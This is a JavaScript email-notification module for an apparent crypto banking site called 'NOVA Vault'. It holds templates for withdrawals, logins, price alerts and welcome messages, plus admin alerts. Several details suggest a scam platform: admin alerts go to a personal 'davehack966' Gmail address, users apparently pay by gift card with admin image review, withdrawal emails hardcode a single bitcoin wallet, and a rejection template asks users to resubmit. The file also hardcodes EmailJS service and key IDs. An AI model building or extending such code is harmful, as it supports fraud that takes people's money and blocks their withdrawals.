import emailjs from "@emailjs/browser";

const SERVICE_ID  = "service_d9osl1s";
const TEMPLATE_ID = "template_sjk9fr4";
const PUBLIC_KEY  = "t8kS5uait_n1Z8x-i";

const ADMIN_EMAIL = "davehack966@gmail.com";

emailjs.init(PUBLIC_KEY);

export async function sendEmail({ to_email, to_name, subject, message }) {
  try {
    await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_email,
      to_name,
      subject,
      message,
    });
    return true;
  } catch (err) {
    console.error("Email failed:", err);
    return false;
  }
}

// Pre-built email types
export const Emails = {
  withdrawalSubmitted: (user, amount, symbol) => ({
    to_email: user.email,
    to_name:  user.name,
    subject:  "Withdrawal Request Received",
    message:  `Your withdrawal request of ${amount} ${symbol} has been received and is now pending review.\n\nWallet: bc1qmwt97a72cmwvkkqq9zervfqd8j43nm7mqdv5ze\n\nEstimated processing time: 1–3 business days.\n\nIf you did not request this withdrawal, please contact support immediately.`,
  }),

  loginDetected: (user) => ({
    to_email: user.email,
    to_name:  user.name,
    subject:  "New Login Detected",
    message:  `A new login to your NOVA Vault account was detected.\n\nTime: ${new Date().toLocaleString()}\nDevice: Web Browser\n\nIf this was not you, please change your password immediately and contact support.`,
  }),

  alertTriggered: (user, symbol, direction, target, current) => ({
    to_email: user.email,
    to_name:  user.name,
    subject:  `Price Alert — ${symbol} ${direction === "above" ? "▲" : "▼"} $${target.toLocaleString()}`,
    message:  `Your price alert for ${symbol} has been triggered!\n\nCondition: ${symbol} ${direction === "above" ? "rose above" : "dropped below"} $${target.toLocaleString()}\nCurrent Price: $${current.toLocaleString()}\n\nLog in to NOVA Vault to take action.`,
  }),

  transactionConfirmed: (user, type, amount, symbol) => ({
    to_email: user.email,
    to_name:  user.name,
    subject:  `Transaction Confirmed — ${type} ${symbol}`,
    message:  `Your ${type} transaction has been confirmed.\n\nAmount: ${amount} ${symbol}\nStatus: Confirmed ✓\nTime: ${new Date().toLocaleString()}\n\nThank you for using NOVA Vault.`,
  }),

  welcomeEmail: (user) => ({
    to_email: user.email,
    to_name:  user.name,
    subject:  "Welcome to NOVA Vault 🎉",
    message:  `Welcome to NOVA Vault, ${user.name}!\n\nYour premium crypto banking account has been created successfully.\n\nYou can now:\n• Buy, sell and swap crypto\n• Set price alerts\n• Withdraw funds securely\n• Track your portfolio in real time\n\nIf you have any questions, our support team is here 24/7.\n\nWelcome aboard!`,
  }),

  // ── Admin alerts ──────────────────────────────────────────────
  adminWithdrawalAlert: (user, amount, currency, destWallet) => ({
    to_email: ADMIN_EMAIL,
    to_name:  "Admin",
    subject:  `🔔 New Withdrawal Request — ${amount} ${currency}`,
    message:  `A new withdrawal request has been submitted.\n\nUser: ${user.name}\nEmail: ${user.email}\nAmount: ${amount} ${currency}\nDestination: ${destWallet}\n\nLog in to the Admin Panel to review and approve/reject this request.`,
  }),

  withdrawalRejected: (user, amount, symbol, reason) => ({
  to_email: user.email,
  to_name:  user.name,
  subject:  "Withdrawal Request Update",
  message:  `Your withdrawal request of ${amount} ${symbol} could not be processed.\n\nReason: ${reason}\n\nWhat to do next:\nPlease review the reason above and resubmit your withdrawal request with the correct information. If you believe this is an error, contact our support team for assistance.\n\nWe apologize for any inconvenience.`,
}),

  adminGiftCardAlert: (user, cardLabel, amount) => ({
    to_email: ADMIN_EMAIL,
    to_name:  "Admin",
    subject:  `🎁 New Gift Card Submission — $${amount}`,
    message:  `A new gift card payment has been submitted.\n\nUser: ${user.name}\nEmail: ${user.email}\nCard Type: ${cardLabel}\nAmount: $${amount}\n\nLog in to the Admin Panel to view the image and approve/reject this submission.`,
  }),
};